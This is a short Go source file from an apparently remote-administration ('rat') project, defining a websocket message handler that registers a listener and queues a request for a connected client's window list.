package main

import (
	"rat/shared"
	"rat/shared/network/header"

	"golang.org/x/net/websocket"
)

type WindowMessage struct {
	Frames []shared.Window `json:"frames"`
}

func (m WindowMessage) Header() MessageHeader {
	return Windows
}

func (d WindowMessage) Handle(ws *websocket.Conn, client *Client, data string) error {
	client.Listeners[header.WindowsHeader] = ws
	client.Queue <- &WindowsPacket{}

	return nil
}
